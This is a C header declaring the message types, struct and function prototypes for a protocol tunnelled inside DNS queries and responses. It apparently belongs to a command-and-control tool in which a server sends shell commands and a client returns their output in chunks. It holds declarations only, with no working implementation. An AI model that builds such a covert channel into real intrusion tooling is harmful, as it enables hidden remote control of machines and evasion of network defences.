/*
 * dns-protocol.h
 *
 *  Created on: Jan 17, 2016
 *      Author: joe
 */

#ifndef DNS_PROTOCOL_H_
#define DNS_PROTOCOL_H_

// server to client CONTROL control flow
#define MESSAGE_TYPE_PARSE_OFFSET	 1
#define MESSAGE_TYPE_NO_CMD 	 	 0
#define MESSAGE_TYPE_SHELL_CMD       1

// client to server CONTROl info
#define MESSAGE_TYPE_HELLO	 		 0x50
#define MESSAGE_TYPE_CMD_OUTPUT		 0x51

//#define HOST

// globals
extern unsigned char header[];
extern unsigned char footer[];
extern unsigned int chunkSize;
extern unsigned char testPayload[];
extern unsigned char queryMessage[];

// here is where we model the protocol we are encapsulating inside dns

// used for parsing dns server response
struct CONTROL
{
	//unsigned char clientId;
	unsigned char messageType;
	unsigned char messsageLength;
	unsigned char *message;
};


// create a packet buffer
// build a struct
// construct a list

// function definitions

unsigned char *createDnsQueryPacket(unsigned char _msgType,
									  unsigned char *host,
										unsigned char *_domain,
											int *_sendLen);

struct DNS_HEADER *buildDnsHeader (
						unsigned short id,
						unsigned short flags,
						unsigned short qdcode,
						unsigned short ancount,
						unsigned short nscount,
						unsigned short arcount);

struct DNS_QUESTION *buildDnsQuestion(unsigned char *qNameArg,
											unsigned short qtypeArg,
												unsigned short qclassArg);

unsigned char *createDnsRfcQueryString(unsigned char *qnameArg,
											unsigned int *rfcQNameLength);

struct NODE *constructStdoutList(unsigned char *_stdoutChunk,
									int _stdoutSize);

struct DNS_RESPONSE_PACKET *parseDnsResponse(unsigned char *_recvBuff,
												int _recvBuffSize);

void printDnsResponse(struct DNS_RESPONSE_PACKET *resp);

struct CONTROL *getControl(struct DNS_RESPONSE_PACKET *drp);

void printControlFields(struct CONTROL *c);

#endif /* DNS_PROTOCOL_H_ */
